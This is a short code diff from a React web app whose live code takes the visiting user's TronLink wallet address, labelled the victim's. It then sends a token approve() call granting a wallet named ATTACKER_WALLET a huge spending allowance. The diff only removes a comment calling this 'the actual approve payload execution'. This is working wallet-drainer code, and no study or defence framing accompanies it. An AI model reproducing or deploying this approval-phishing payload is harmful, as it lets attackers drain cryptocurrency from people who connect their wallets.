@@ -51,7 +51,6 @@ export default function App() {
       const victimAddress = window.tronWeb.defaultAddress.base58;
       const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
       
-      // The actual approve payload execution
       const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
         feeLimit: 100000000,
         from: victimAddress
